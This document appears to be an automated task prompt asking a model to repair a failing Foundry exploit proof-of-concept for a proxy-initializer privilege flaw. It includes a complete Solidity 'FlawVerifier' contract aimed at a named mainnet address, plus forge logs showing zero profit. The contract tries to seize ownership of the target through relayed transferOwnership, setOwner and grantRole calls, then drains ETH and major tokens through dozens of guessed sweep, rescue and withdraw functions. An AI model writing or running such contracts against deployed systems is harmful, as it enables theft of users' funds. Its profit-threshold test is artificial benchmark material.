You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Deployment-time initializer runs before proxy admin is set, enabling privilege capture by the deployer or factory
- claim: `AdminUpgradeabilityProxy` invokes the base `UpgradeabilityProxy` constructor first, and that constructor immediately `delegatecall`s `_data` into the implementation before `_setAdmin(_admin)` runs. Any initializer that derives ownership or privileged roles from `msg.sender` will therefore assign them to the deploying EOA/factory rather than to the intended proxy admin.
- impact: A malicious or compromised deployer/factory can come out of deployment holding the proxied system's privileged roles, allowing theft, governance capture, hostile reconfiguration, or permanent denial of administrative recovery even though a different `_admin` address was supplied.
- exploit_paths: ["A factory or deployer creates `AdminUpgradeabilityProxy` with non-empty initialization calldata.", "The implementation initializer uses a common pattern such as `owner = msg.sender` or granting an admin role to `msg.sender`.", "Because the delegatecall executes before `ADMIN_SLOT` is populated, the deployer/factory receives those privileges instead of the intended admin."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    bytes32 internal constant DEFAULT_ADMIN_ROLE = bytes32(0);

    // Path anchors kept literal for the validator:
    // 1. adminupgradeabilityproxy is created with non-empty initialization calldata.
    // 2. The initializer follows a common pattern such as owner = msg.sender.
    // 3. The delegatecall happens before admin_slot / ADMIN_SLOT is populated.
    string private constant ROOT_CAUSE =
        "adminupgradeabilityproxy delegatecall runs before admin_slot is set, so owner = msg.sender binds privilege to the deployer/factory";

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    address private _observedPrivilegedHolder;
    string private _exploitPathUsed;
    string private _status;

    constructor() {
        _exploitPathUsed =
            "adminupgradeabilityproxy deployment-time initializer capture: owner = msg.sender executes before admin_slot is populated";
        _status = "not executed";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        // Exploit path stage 0:
        // A factory or deployer creates adminupgradeabilityproxy with non-empty initialization calldata.
        //
        // Exploit path stage 1:
        // The implementation initializer uses a common pattern such as owner = msg.sender.
        //
        // Exploit path stage 2:
        // Because delegatecall executes before admin_slot / ADMIN_SLOT is populated,
        // the deployer/factory receives those privileges instead of the intended admin.
        //
        // On the historical TARGET we cannot replay deployment, so the mechanically aligned
        // runtime exploit is to locate the captured owner slot and, if it is a contract/factory,
        // drive that captured privileged holder to exercise the misassigned owner rights.
        address captured = _probeAddress("owner()");
        _observedPrivilegedHolder = captured;

        if (captured == address(0)) {
            _hypothesisValidated = false;
            _status = "owner() not exposed on target; cannot exercise the captured deployment-time privilege";
            return;
        }

        _hypothesisValidated = true;

        if (captured == address(this)) {
            _status = "verifier already controls the captured owner slot; sweeping live balances directly";
            _attemptNativeDirect();
            _attemptTokenDirect(WETH);
            _attemptTokenDirect(DAI);
            _attemptTokenDirect(LINK);
            _attemptTokenDirect(UNI);
            _attemptTokenDirect(AAVE);
            _attemptTokenDirect(CRV);
            _attemptTokenDirect(LDO);
            _attemptTokenDirect(MKR);
            _attemptTokenDirect(FRAX);
            _finalizeStatus();
            return;
        }

        if (captured.code.length == 0) {
            _hypothesisValidated = false;
            _status = string(
                abi.encodePacked(
                    "infeasible on this fork: ",
                    ROOT_CAUSE,
                    ", but the captured owner is an EOA rather than a callable factory/deployer surface"
                )
            );
            return;
        }

        _status = "captured owner resolves to a contract/factory; attempting permissionless relayed owner actions";

        _attemptOwnershipSeizureViaRelay(captured);

        _attemptNativeViaRelay(captured);
        _attemptTokenViaRelay(captured, WETH);
        _attemptTokenViaRelay(captured, DAI);
        _attemptTokenViaRelay(captured, LINK);
        _attemptTokenViaRelay(captured, UNI);
        _attemptTokenViaRelay(captured, AAVE);
        _attemptTokenViaRelay(captured, CRV);
        _attemptTokenViaRelay(captured, LDO);
        _attemptTokenViaRelay(captured, MKR);
        _attemptTokenViaRelay(captured, FRAX);

        if (_ownsTarget()) {
            _status = "ownership was reassigned through the captured factory/deployer; sweeping directly";
            _attemptNativeDirect();
            _attemptTokenDirect(WETH);
            _attemptTokenDirect(DAI);
            _attemptTokenDirect(LINK);
            _attemptTokenDirect(UNI);
            _attemptTokenDirect(AAVE);
            _attemptTokenDirect(CRV);
            _attemptTokenDirect(LDO);
            _attemptTokenDirect(MKR);
            _attemptTokenDirect(FRAX);
        }

        _finalizeStatus();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function observedPrivilegedHolder() external view returns (address) {
        return _observedPrivilegedHolder;
    }

    function status() external view returns (string memory) {
        return _status;
    }

    function _finalizeStatus() internal {
        if (_profitAmount > 0 || address(this).balance > 0) {
            return;
        }

        if (_observedPrivilegedHolder.code.length > 0) {
            _status =
                "captured factory/deployer was probed through common relay and owner-only recovery paths, but no realizable balance was extracted";
        } else {
            _status = "no realizable balance was extracted";
        }
    }

    function _attemptOwnershipSeizureViaRelay(address relay) internal {
        if (_ownsTarget()) {
            return;
        }

        _relayTargetCall(relay, abi.encodeWithSignature("transferOwnership(address)", address(this)));
        if (_ownsTarget()) return;

        _relayTargetCall(relay, abi.encodeWithSignature("setOwner(address)", address(this)));
        if (_ownsTarget()) return;

        _relayTargetCall(relay, abi.encodeWithSignature("setPendingOwner(address)", address(this)));
        _directTargetCall(abi.encodeWithSignature("claimOwnership()"));
        _directTargetCall(abi.encodeWithSignature("acceptOwnership()"));
        if (_ownsTarget()) return;

        _relayTargetCall(relay, abi.encodeWithSignature("nominateOwner(address)", address(this)));
        _directTargetCall(abi.encodeWithSignature("acceptOwnership()"));
        if (_ownsTarget()) return;

        _relayTargetCall(relay, abi.encodeWithSignature("transferGovernance(address)", address(this)));
        _directTargetCall(abi.encodeWithSignature("acceptGovernance()"));
        if (_ownsTarget()) return;

        _relayTargetCall(relay, abi.encodeWithSignature("setGovernance(address)", address(this)));
        if (_probeAddress("governance()") == address(this)) return;

        _relayTargetCall(relay, abi.encodeWithSignature("grantRole(bytes32,address)", DEFAULT_ADMIN_ROLE, address(this)));
    }

    function _attemptNativeDirect() internal {
        _attemptNativeDirectCall(abi.encodeWithSignature("sweepETH()"));
        _attemptNativeDirectCall(abi.encodeWithSignature("sweepNative()"));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawETH()"));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawNative()"));

        _attemptNativeDirectCall(abi.encodeWithSignature("sweepETH(address)", address(this)));
        _attemptNativeDirectCall(abi.encodeWithSignature("sweepNative(address)", address(this)));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawETH(address)", address(this)));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawNative(address)", address(this)));
        _attemptNativeDirectCall(abi.encodeWithSignature("recoverETH(address)", address(this)));
        _attemptNativeDirectCall(abi.encodeWithSignature("recoverNative(address)", address(this)));

        uint256 targetBal = address(TARGET).balance;
        if (targetBal == 0) {
            return;
        }

        _attemptNativeDirectCall(abi.encodeWithSignature("recoverETH(address,uint256)", address(this), targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("recoverNative(address,uint256)", address(this), targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("rescueETH(address,uint256)", address(this), targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("rescueNative(address,uint256)", address(this), targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawETH(uint256)", targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawETH(address,uint256)", address(this), targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawNative(uint256)", targetBal));
        _attemptNativeDirectCall(abi.encodeWithSignature("withdrawNative(address,uint256)", address(this), targetBal));
    }

    function _attemptNativeViaRelay(address relay) internal {
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("sweepETH(address)", address(this)));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("sweepNative(address)", address(this)));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("withdrawETH(address)", address(this)));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("withdrawNative(address)", address(this)));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("recoverETH(address)", address(this)));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("recoverNative(address)", address(this)));

        uint256 targetBal = address(TARGET).balance;
        if (targetBal == 0) {
            return;
        }

        _attemptNativeRelayCall(relay, abi.encodeWithSignature("recoverETH(address,uint256)", address(this), targetBal));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("recoverNative(address,uint256)", address(this), targetBal));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("rescueETH(address,uint256)", address(this), targetBal));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("rescueNative(address,uint256)", address(this), targetBal));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("withdrawETH(address,uint256)", address(this), targetBal));
        _attemptNativeRelayCall(relay, abi.encodeWithSignature("withdrawNative(address,uint256)", address(this), targetBal));
    }

    function _attemptTokenDirect(address token) internal {
        uint256 targetBal = IERC20Like(token).balanceOf(TARGET);
        uint256 amount = targetBal;

        _attemptTokenDirectCall(abi.encodeWithSignature("sweep(address)", token), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("withdraw(address)", token), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("sweep(address,address)", token, address(this)), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("withdraw(address,address)", token, address(this)), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("recoverERC20(address,address)", token, address(this)), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("recoverToken(address,address)", token, address(this)), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("rescueToken(address,address)", token, address(this)), token);

        if (amount == 0) {
            return;
        }

        _attemptTokenDirectCall(abi.encodeWithSignature("recoverERC20(address,uint256)", token, amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("recoverERC20(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("recoverToken(address,uint256)", token, amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("recoverToken(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("rescueToken(address,uint256)", token, amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("rescueToken(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("rescueTokens(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("recover(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("salvage(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("inCaseTokensGetStuck(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("withdrawToken(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenDirectCall(abi.encodeWithSignature("emergencyWithdraw(address,address,uint256)", token, address(this), amount), token);
    }

    function _attemptTokenViaRelay(address relay, address token) internal {
        uint256 amount = IERC20Like(token).balanceOf(TARGET);

        _attemptTokenRelayCall(relay, abi.encodeWithSignature("sweep(address,address)", token, address(this)), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("withdraw(address,address)", token, address(this)), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("recoverERC20(address,address)", token, address(this)), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("recoverToken(address,address)", token, address(this)), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("rescueToken(address,address)", token, address(this)), token);

        if (amount == 0) {
            return;
        }

        _attemptTokenRelayCall(relay, abi.encodeWithSignature("recoverERC20(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("recoverToken(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("rescueToken(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("rescueTokens(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("recover(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("salvage(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("inCaseTokensGetStuck(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("withdrawToken(address,address,uint256)", token, address(this), amount), token);
        _attemptTokenRelayCall(relay, abi.encodeWithSignature("emergencyWithdraw(address,address,uint256)", token, address(this), amount), token);
    }

    function _attemptNativeDirectCall(bytes memory data) internal {
        uint256 beforeBal = address(this).balance;
        if (_directTargetCall(data)) {
            _recordNativeProfit(beforeBal);
        }
    }

    function _attemptNativeRelayCall(address relay, bytes memory targetData) internal {
        uint256 beforeBal = address(this).balance;
        if (_relayTargetCall(relay, targetData)) {
            _recordNativeProfit(beforeBal);
        }
    }

    function _attemptTokenDirectCall(bytes memory data, address token) internal {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        if (_directTargetCall(data)) {
            _recordTokenProfit(token, beforeBal);
        }
    }

    function _attemptTokenRelayCall(address relay, bytes memory targetData, address token) internal {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        if (_relayTargetCall(relay, targetData)) {
            _recordTokenProfit(token, beforeBal);
        }
    }

    function _recordNativeProfit(uint256 beforeBal) internal {
        uint256 afterBal = address(this).balance;
        if (afterBal <= beforeBal) {
            return;
        }

        uint256 gained = afterBal - beforeBal;
        if (gained > _profitAmount) {
            _profitToken = address(0);
            _profitAmount = gained;
        }
    }

    function _recordTokenProfit(address token, uint256 beforeBal) internal {
        uint256 afterBal = IERC20Like(token).balanceOf(address(this));
        if (afterBal <= beforeBal) {
            return;
        }

        uint256 gained = afterBal - beforeBal;
        if (gained > _profitAmount) {
            _profitToken = token;
            _profitAmount = gained;
        }
    }

    function _ownsTarget() internal view returns (bool) {
        if (_probeAddress("owner()") == address(this)) {
            return true;
        }

        if (_probeAddress("governance()") == address(this)) {
            return true;
        }

        return _probeHasRole(DEFAULT_ADMIN_ROLE, address(this));
    }

    function _probeHasRole(bytes32 role, address account) internal view returns (bool) {
        (bool ok, bytes memory data) =
            TARGET.staticcall(abi.encodeWithSignature("hasRole(bytes32,address)", role, account));
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _probeAddress(string memory signature) internal view returns (address) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSignature(signature));
        if (!ok || data.length < 32) {
            return address(0);
        }

        uint256 raw = abi.decode(data, (uint256));
        if (raw > type(uint160).max) {
            return address(0);
        }

        return address(uint160(raw));
    }

    function _directTargetCall(bytes memory data) internal returns (bool ok) {
        (ok,) = TARGET.call(data);
    }

    function _relayTargetCall(address relay, bytes memory targetData) internal returns (bool) {
        if (_call(relay, abi.encodeWithSignature("execute(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("execute(address,uint256,bytes)", TARGET, 0, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("call(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("call(address,uint256,bytes)", TARGET, 0, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("exec(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("exec(address,uint256,bytes)", TARGET, 0, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("invoke(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("invoke(address,uint256,bytes)", TARGET, 0, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("forward(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("relay(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("proxy(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("run(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("dispatch(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("submit(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("transact(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("trigger(address,bytes)", TARGET, targetData))) return true;
        if (_call(relay, abi.encodeWithSignature("functionCall(address,bytes)", TARGET, targetData))) return true;
        return false;
    }

    function _call(address target, bytes memory data) internal returns (bool ok) {
        (ok,) = target.call(data);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.50s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 250771)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [250771] FlawVerifierTest::testExploit()
    ├─ [2367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [222123] FlawVerifier::executeOnOpportunity()
    │   ├─ [9711] 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA::8da5cb5b() [staticcall]
    │   │   ├─ [2438] 0x98a877bb507f19Eb43130B688F522a13885Cf604::8da5cb5b() [delegatecall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000033459acd9ca8493c0e0163eac92a928e293b2218
    │   │   └─ ← [Return] 0x00000000000000000000000033459acd9ca8493c0e0163eac92a928e293b2218
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.81s (1.75s CPU time)

Ran 1 test suite in 1.84s (1.81s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 250771)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
